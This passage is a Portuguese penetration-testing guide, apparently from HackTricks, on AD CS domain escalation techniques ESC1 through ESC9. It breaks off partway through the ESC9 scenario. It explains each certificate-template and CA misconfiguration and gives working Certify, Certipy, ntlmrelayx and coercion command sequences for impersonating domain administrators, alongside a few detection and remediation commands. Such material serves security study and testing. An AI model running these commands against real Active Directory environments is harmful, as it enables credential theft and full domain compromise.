# Escalação de Domínio do AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Este é um resumo das seções sobre técnicas de escalação das publicações:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Templates de Certificados Mal Configurados - ESC1

### Explicação

### Explicação sobre Templates de Certificados Mal Configurados - ESC1

- **Direitos de inscrição são concedidos a usuários com poucos privilégios pela CA corporativa.**
- **A aprovação do gerente não é necessária.**
- **Nenhuma assinatura de pessoal autorizado é necessária.**
- **Os descritores de segurança nos templates de certificados são permissivos demais, permitindo que usuários com poucos privilégios obtenham direitos de inscrição.**
- **Os templates de certificados são configurados para definir EKUs que facilitam a autenticação:**
- Identificadores de Uso Estendido de Chave (EKU), como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ou nenhum EKU (SubCA) estão incluídos.
- **A capacidade de os solicitantes incluírem um subjectAltName na Certificate Signing Request (CSR) é permitida pelo template:**
- O Active Directory (AD) prioriza o subjectAltName (SAN) em um certificado para verificação de identidade, quando presente. Isso significa que, ao especificar o SAN em uma CSR, é possível solicitar um certificado para personificar qualquer usuário (por exemplo, um administrador do domínio). A possibilidade de o solicitante especificar um SAN é indicada no objeto do AD correspondente ao template de certificado por meio da propriedade `mspki-certificate-name-flag`. Essa propriedade é uma bitmask, e a presença da flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite que o SAN seja especificado pelo solicitante.

> [!CAUTION]
> A configuração descrita permite que usuários com poucos privilégios solicitem certificados com qualquer SAN de sua escolha, possibilitando a autenticação como qualquer principal do domínio por meio de Kerberos ou SChannel.

Esse recurso às vezes é habilitado para permitir a geração sob demanda de certificados HTTPS ou de host por produtos ou serviços de implantação, ou por falta de conhecimento.

Observa-se que criar um certificado com essa opção ativa um aviso, o que não ocorre quando um template de certificado existente (como o template `WebServer`, que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada) é duplicado e depois modificado para incluir um OID de autenticação.

### Abuso

Para **encontrar templates de certificados vulneráveis**, você pode executar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **explorar esta vulnerabilidade para se passar por um administrador**, pode-se executar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Então, você pode transformar o **certificado para o formato `.pfx`** e usá-lo para **autenticar usando Rubeus ou certipy** novamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

A enumeração de certificate templates no configuration schema da AD Forest, especificamente aqueles que não exigem aprovação ou assinaturas, possuem um EKU de Client Authentication ou Smart Card Logon e têm a flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, pode ser realizada executando a seguinte consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Templates de certificados configurados incorretamente - ESC2

### Explicação

O segundo cenário de abuso é uma variação do primeiro:

1. Os direitos de enrollment são concedidos a usuários com poucos privilégios pela Enterprise CA.
2. O requisito de aprovação do gerente está desabilitado.
3. A necessidade de assinaturas autorizadas é omitida.
4. Um security descriptor excessivamente permissivo no certificate template concede direitos de enrollment de certificados a usuários com poucos privilégios.
5. **O certificate template é definido para incluir o Any Purpose EKU ou nenhum EKU.**

O **Any Purpose EKU** permite que um certificado seja obtido por um atacante para **qualquer finalidade**, incluindo autenticação de cliente, autenticação de servidor, assinatura de código etc. A mesma **técnica usada para ESC3** pode ser empregada para explorar esse cenário.

Certificados **sem EKUs**, que atuam como certificados de CA subordinada, podem ser explorados para **qualquer finalidade** e **também podem ser usados para assinar novos certificados**. Dessa forma, um atacante poderia especificar EKUs ou campos arbitrários nos novos certificados utilizando um certificado de CA subordinada.

No entanto, novos certificados criados para **autenticação no domínio** não funcionarão se a CA subordinada não for confiável pelo objeto **`NTAuthCertificates`**, que é a configuração padrão. Ainda assim, um atacante pode criar **novos certificados com qualquer EKU** e valores arbitrários. Eles poderiam ser potencialmente **abusados** para uma ampla variedade de finalidades (por exemplo, assinatura de código, autenticação de servidor etc.) e poderiam ter implicações significativas para outras aplicações na rede, como SAML, AD FS ou IPSec.

Para enumerar templates que correspondem a esse cenário no schema de configuração da AD Forest, a seguinte consulta LDAP pode ser executada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Templates de Enrollment Agent mal configurados - ESC3

### Explicação

Este cenário é semelhante ao primeiro e ao segundo, mas **explora** um **EKU diferente** (Certificate Request Agent) e **2 templates diferentes** (portanto, possui 2 conjuntos de requisitos),

O **EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), conhecido como **Enrollment Agent** na documentação da Microsoft, permite que um principal se **inscreva** para obter um **certificado** **em nome de outro usuário**.

O **“Enrollment Agent”** se **inscreve** nesse **template** e usa o **certificado resultante para assinar conjuntamente uma CSR em nome do outro usuário**. Em seguida, ele **envia** a **CSR assinada conjuntamente** para a CA, inscrevendo-se em um **template** que **permite “enroll on behalf of”**, e a CA responde com um **certificado pertencente ao “outro” usuário**.

**Requisitos 1:**

- Direitos de enrollment são concedidos a usuários com poucos privilégios pela Enterprise CA.
- O requisito de aprovação do gerente é omitido.
- Nenhum requisito de assinaturas autorizadas.
- O security descriptor do certificate template é permissivo em excesso, concedendo direitos de enrollment a usuários com poucos privilégios.
- O certificate template inclui o EKU Certificate Request Agent, permitindo a solicitação de outros certificate templates em nome de outros principais.

**Requisitos 2:**

- A Enterprise CA concede direitos de enrollment a usuários com poucos privilégios.
- A aprovação do gerente é ignorada.
- A versão do schema do template é 1 ou superior a 2, e ele especifica um Application Policy Issuance Requirement que exige o EKU Certificate Request Agent.
- Um EKU definido no certificate template permite a autenticação no domínio.
- Restrições para enrollment agents não são aplicadas na CA.

### Exploração

Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para explorar este cenário:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Os **usuários** autorizados a **obter** um **enrollment agent certificate**, os templates nos quais os **agents** de enrollment podem realizar enrollment e as **contas** em nome das quais o enrollment agent pode atuar podem ser restringidos pelas CAs empresariais. Isso é feito abrindo o **snap-in** `certsrc.msc`, **clicando com o botão direito na CA**, **clicando em Properties** e, em seguida, **navegando** até a aba “Enrollment Agents”.

No entanto, observa-se que a configuração **padrão** das CAs é “**Do not restrict enrollment agents**”. Quando a restrição aos enrollment agents é habilitada pelos administradores, definindo-a como “Restrict enrollment agents”, a configuração padrão continua extremamente permissiva. Ela permite que **Everyone** faça enrollment em todos os templates como qualquer pessoa.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

O **security descriptor** dos **certificate templates** define as **permissões** que **principals do AD** específicos possuem em relação ao template.

Caso um **attacker** possua as **permissões** necessárias para **alterar** um **template** e **instituir** qualquer uma das **exploitable misconfigurations** descritas nas **seções anteriores**, a privilege escalation poderá ser facilitada.

As permissões relevantes aplicáveis aos certificate templates incluem:

- **Owner:** Concede controle implícito sobre o objeto, permitindo a modificação de quaisquer atributos.
- **FullControl:** Permite autoridade completa sobre o objeto, incluindo a capacidade de alterar quaisquer atributos.
- **WriteOwner:** Permite alterar o owner do objeto para um principal controlado pelo attacker.
- **WriteDacl:** Permite ajustar os controles de acesso, potencialmente concedendo FullControl a um attacker.
- **WriteProperty:** Autoriza a edição de quaisquer propriedades do objeto.

### Abuse

Para identificar principals com direitos de edição em templates e outros objetos PKI, faça a enumeração com Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Um exemplo de privesc como o anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ocorre quando um usuário tem privilégios de escrita sobre um certificate template. Isso pode, por exemplo, ser abusado para sobrescrever a configuração do certificate template e torná-lo vulnerável a ESC1.

Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas nosso usuário `JOHN` tem a nova edge `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificates, também implementei esse ataque, que é conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o NT hash da vítima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** pode sobrescrever a configuração de um certificate template com um único comando. Por **padrão**, o Certipy **sobrescreverá** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o **`-save-old` parameter para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controle de Acesso Vulnerável a Objetos de PKI - ESC5

### Explicação

A extensa rede de relacionamentos baseados em ACL, que inclui diversos objetos além dos certificate templates e da certificate authority, pode afetar a segurança de todo o sistema AD CS. Esses objetos, que podem impactar significativamente a segurança, incluem:

- O objeto de computador do AD referente ao servidor da CA, que pode ser comprometido por mecanismos como S4U2Self ou S4U2Proxy.
- O servidor RPC/DCOM do servidor da CA.
- Qualquer objeto ou container descendente do AD dentro do caminho de container específico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Esse caminho inclui, entre outros, containers e objetos como o container Certificate Templates, o container Certification Authorities, o objeto NTAuthCertificates e o Enrollment Services Container.

A segurança do sistema PKI pode ser comprometida se um atacante com poucos privilégios conseguir obter controle sobre qualquer um desses componentes críticos.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

O assunto abordado no [**post da CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) também trata das implicações da flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, conforme descrito pela Microsoft. Quando ativada em uma Certification Authority (CA), essa configuração permite a inclusão de **valores definidos pelo usuário** no **subject alternative name** de **qualquer solicitação**, incluindo aquelas construídas a partir do Active Directory®. Consequentemente, essa configuração permite que um **invasor** faça enrollment por meio de **qualquer template** configurado para **autenticação** no domínio — especificamente aqueles abertos para enrollment por usuários **sem privilégios**, como o template User padrão. Como resultado, é possível obter um certificado que permita ao invasor autenticar-se como administrador do domínio ou como **qualquer outra entidade ativa** dentro do domínio.

**Nota**: A abordagem para adicionar **nomes alternativos** a uma Certificate Signing Request (CSR), por meio do argumento `-attrib "SAN:"` no `certreq.exe` (referido como “Name Value Pairs”), apresenta uma **diferença** em relação à estratégia de exploração de SANs no ESC1. Aqui, a distinção está em **como as informações da conta são encapsuladas** — dentro de um atributo do certificado, em vez de uma extensão.

### Abuso

Para verificar se a configuração está ativada, as organizações podem utilizar o seguinte comando com `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Essa operação essencialmente emprega **acesso ao registro remoto**, portanto, uma abordagem alternativa poderia ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Ferramentas como [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) são capazes de detectar essa configuração incorreta e explorá-la:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para alterar essas configurações, supondo que se possuam direitos de **administrador do domínio** ou equivalentes, o seguinte comando pode ser executado de qualquer estação de trabalho:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para desabilitar essa configuração em seu ambiente, a flag pode ser removida com:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Após as atualizações de segurança de maio de 2022, os **certificados** recém-emitidos conterão uma **extensão de segurança** que incorpora a propriedade `objectSid` do **requester**. No ESC1, esse SID é derivado do SAN especificado. No entanto, para o **ESC6**, o SID corresponde ao `objectSid` do **requester**, não ao SAN.\
> Para explorar o ESC6, é essencial que o sistema seja suscetível ao ESC10 (Weak Certificate Mappings), que prioriza o **SAN em relação à nova extensão de segurança**.

## Controle de Acesso da Certificate Authority Vulnerável - ESC7

### Attack 1

#### Explanation

O controle de acesso de uma certificate authority é mantido por meio de um conjunto de permissões que controlam as ações da CA. Essas permissões podem ser visualizadas acessando `certsrv.msc`, clicando com o botão direito em uma CA, selecionando as propriedades e navegando até a aba Security. Além disso, as permissões podem ser enumeradas usando o módulo PSPKI com comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Isso fornece insights sobre os principais direitos, especificamente **`ManageCA`** e **`ManageCertificates`**, correspondentes às funções de “administrador da CA” e “Certificate Manager”, respectivamente.

#### Abuse

Ter direitos de **`ManageCA`** em uma autoridade de certificação permite que o principal manipule configurações remotamente usando PSPKI. Isso inclui ativar o sinalizador **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir a especificação de SAN em qualquer template, um aspecto crítico da domain escalation.

A simplificação desse processo é possível usando o cmdlet **Enable-PolicyModuleFlag** do PSPKI, permitindo modificações sem interação direta com a GUI.

Possuir direitos de **`ManageCertificates`** facilita a aprovação de requests pendentes, contornando efetivamente a proteção de "aprovação pelo certificate manager da CA".

Uma combinação dos módulos **Certify** e **PSPKI** pode ser usada para solicitar, aprovar e baixar um certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicação

> [!WARNING]
> No **ataque anterior**, as permissões **`Manage CA`** foram usadas para **habilitar** o sinalizador **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para realizar o **ataque ESC6**, mas isso não terá efeito até que o serviço da CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso **`Manage CA`**, ele também pode **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o E**SC6 pode não funcionar imediatamente** na maioria dos ambientes corrigidos devido às atualizações de segurança de maio de 2022.

Portanto, outro ataque é apresentado aqui.

Pré-requisitos:

- Somente a permissão **`ManageCA`**
- Permissão **`Manage Certificates`** (pode ser concedida a partir de **`ManageCA`**)
- O template de certificado **`SubCA`** deve estar **habilitado** (pode ser habilitado a partir de **`ManageCA`**)

A técnica depende do fato de que usuários com os direitos de acesso `Manage CA` _e_ `Manage Certificates` podem **emitir solicitações de certificado com falha**. O template de certificado **`SubCA`** é **vulnerável ao ESC1**, mas **somente administradores** podem se inscrever no template. Assim, um **usuário** pode **solicitar** a inscrição no **`SubCA`** — o que será **negado** —, mas **depois emitido pelo gerente**.

#### Abuso

Você pode **conceder a si mesmo o direito de acesso `Manage Certificates`** adicionando seu usuário como um novo responsável.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
O template **`SubCA`** pode ser **habilitado na CA** com o parâmetro `-enable-template`. Por padrão, o template `SubCA` está habilitado.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se tivermos cumprido os pré-requisitos para este ataque, podemos começar **solicitando um certificado com base no template `SubCA`**.

**Essa solicitação será negada**, mas salvaremos a chave privada e anotaremos o ID da solicitação.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Com nossas permissões **`Manage CA` e `Manage Certificates`**, podemos então **emitir a solicitação de certificado que falhou** com o comando `ca` e o parâmetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E, finalmente, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuso da Extensão Manage Certificates (SetExtension)

#### Explicação

Além dos abusos clássicos do ESC7 (habilitação de atributos EDITF ou aprovação de solicitações pendentes), o **Certify 2.0** revelou uma nova primitiva que exige apenas a função *Manage Certificates* (também conhecida como **Certificate Manager / Officer**) na Enterprise CA.

O método RPC `ICertAdmin::SetExtension` pode ser executado por qualquer principal que possua *Manage Certificates*. Embora o método fosse tradicionalmente usado por CAs legítimas para atualizar extensões em solicitações **pendentes**, um atacante pode abusar dele para **adicionar uma extensão de certificado *não padrão*** (por exemplo, um OID personalizado de *Certificate Issuance Policy*, como `1.1.1.1`) a uma solicitação que aguarda aprovação.

Como o template alvo **não define um valor padrão para essa extensão**, a CA **NÃO** substituirá o valor controlado pelo atacante quando a solicitação for finalmente emitida. Portanto, o certificado resultante conterá uma extensão escolhida pelo atacante que pode:

* Satisfazer requisitos de Application / Issuance Policy de outros templates vulneráveis (resultando em privilege escalation).
* Injetar EKUs ou policies adicionais que concedam ao certificado uma confiança inesperada em sistemas de terceiros.

Em resumo, *Manage Certificates* — anteriormente considerado a metade “menos poderosa” do ESC7 — agora pode ser usado para privilege escalation completa ou persistência de longo prazo, sem alterar a configuração da CA nem exigir o direito mais restritivo *Manage CA*.

#### Abusando da primitiva com Certify 2.0

1. **Envie uma solicitação de certificado que permanecerá *pendente*.** Isso pode ser forçado com um template que exige aprovação do manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Adicione uma extensão personalizada à solicitação pendente** usando o novo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Se o template ainda não definir a extensão *Certificate Issuance Policies*, o valor acima será preservado após a emissão.*

3. **Emita a solicitação** (se sua função também tiver direitos de aprovação *Manage Certificates*) ou aguarde um operador aprová-la. Depois de emitida, faça o download do certificado:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. O certificado resultante agora contém o OID de issuance-policy malicioso e pode ser usado em ataques subsequentes (por exemplo, ESC13, domain escalation etc.).

> NOTA: O mesmo ataque pode ser executado com o Certipy ≥ 4.7 por meio do comando `ca` e do parâmetro `-set-extension`.

## NTLM Relay para Endpoints HTTP do AD CS – ESC8

### Explicação

> [!TIP]
> Em ambientes nos quais o **AD CS está instalado**, se existir um **web enrollment endpoint vulnerável** e pelo menos um **certificate template publicado** que permita enrollment de computadores do domínio e autenticação de cliente (como o template padrão **`Machine`**), torna-se possível **comprometer qualquer computador com o serviço spooler ativo**!

Vários **métodos de enrollment baseados em HTTP** são compatíveis com o AD CS e disponibilizados por funções adicionais de servidor que os administradores podem instalar. Essas interfaces de enrollment de certificados baseadas em HTTP são suscetíveis a **NTLM relay attacks**. Um atacante, a partir de uma **máquina comprometida, pode personificar qualquer conta do AD que se autentique por meio de NTLM de entrada**. Ao personificar a conta vítima, essas interfaces web podem ser acessadas pelo atacante para **solicitar um certificado de autenticação de cliente usando os certificate templates `User` ou `Machine`**.

- A **web enrollment interface** (uma aplicação ASP antiga disponível em `http://<caserver>/certsrv/`) usa HTTP por padrão, o que não oferece proteção contra NTLM relay attacks. Além disso, ela permite explicitamente apenas autenticação NTLM por meio do cabeçalho HTTP Authorization, tornando métodos de autenticação mais seguros, como Kerberos, inaplicáveis.
- O **Certificate Enrollment Service** (CES), o Web Service **Certificate Enrollment Policy** (CEP) e o **Network Device Enrollment Service** (NDES) são compatíveis, por padrão, com autenticação negotiate por meio do cabeçalho HTTP Authorization. A autenticação Negotiate é compatível tanto com **Kerberos quanto com NTLM**, permitindo que um atacante faça **downgrade para autenticação NTLM** durante relay attacks. Embora esses web services habilitem HTTPS por padrão, o HTTPS sozinho **não protege contra NTLM relay attacks**. A proteção contra NTLM relay attacks para serviços HTTPS só é possível quando o HTTPS é combinado com channel binding. Infelizmente, o AD CS não ativa o Extended Protection for Authentication no IIS, que é necessário para channel binding.

Um **problema** comum dos NTLM relay attacks é a **curta duração das sessões NTLM** e a incapacidade do atacante de interagir com serviços que **exigem NTLM signing**.

Ainda assim, essa limitação é superada ao explorar um NTLM relay attack para obter um certificado para o usuário, pois o período de validade do certificado determina a duração da sessão, e o certificado pode ser usado com serviços que **exigem NTLM signing**. Para obter instruções sobre como utilizar um certificado roubado, consulte:


{{#ref}}
account-persistence.md
{{#endref}}

Outra limitação dos NTLM relay attacks é que **uma máquina controlada pelo atacante precisa ser autenticada por uma conta vítima**. O atacante pode esperar ou tentar **forçar** essa autenticação:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

O `cas` do [**Certify**](https://github.com/GhostPack/Certify) enumera **endpoints HTTP do AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

A propriedade `msPKI-Enrollment-Servers` é usada pelas Autoridades de Certificação (CAs) empresariais para armazenar endpoints do Certificate Enrollment Service (CES). Esses endpoints podem ser analisados e listados utilizando a ferramenta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso com Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse com [Certipy](https://github.com/ly4k/Certipy)

A solicitação de um certificado é feita pelo Certipy, por padrão, com base no template `Machine` ou `User`, determinado conforme o nome da conta sendo relayed termina com `$`. A especificação de um template alternativo pode ser feita por meio do parâmetro `-template`.

Uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) pode então ser empregada para forçar a autenticação. Ao lidar com controladores de domínio, é necessário especificar `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicação

O novo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, conhecido como ESC9, impede a incorporação da **nova extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`** em um certificado. Esse flag se torna relevante quando `StrongCertificateBindingEnforcement` está definido como `1` (a configuração padrão), em contraste com a configuração `2`. Sua relevância aumenta em cenários nos quais um mapeamento de certificado mais fraco para Kerberos ou Schannel possa ser explorado (como em ESC10), pois a ausência de ESC9 não alteraria os requisitos.

As condições nas quais a configuração desse flag se torna significativa incluem:

- `StrongCertificateBindingEnforcement` não está ajustado para `2` (o padrão é `1`), ou `CertificateMappingMethods` inclui o flag `UPN`.
- O certificado está marcado com o flag `CT_FLAG_NO_SECURITY_EXTENSION` na configuração `msPKI-Enrollment-Flag`.
- Qualquer EKU de autenticação de cliente é especificado pelo certificado.
- Há permissões `GenericWrite` sobre qualquer conta para comprometer outra.

### Cenário de abuso

Suponha que `John@corp.local` tenha permissões `GenericWrite` sobre `Jane@corp.local`, com o objetivo de comprometer `Administrator@corp.local`. O template de certificado `ESC9`, no qual `Jane@corp.local` tem permissão para se inscrever, está configurado com o flag `CT_FLAG_NO_SECURITY_EXTENSION` na configuração `msPKI-Enrollment-Flag`.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, graças ao `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Subsequentemente, o `userPrincipalName` de `Jane` é modificado para `Administrator`, omitindo propositalmente a parte de domínio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Essa modificação não viola as restrições, considerando que `Administrator@corp.local` continua distinto como o `userPrincipalName` de `Administrator`.

Em seguida, o modelo de certificado `ESC9`, marcado como vulnerável, é solicitado como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Observa-se que o `userPrincipalName` do certificado reflete `Administrator`, sem nenhum “object SID”.

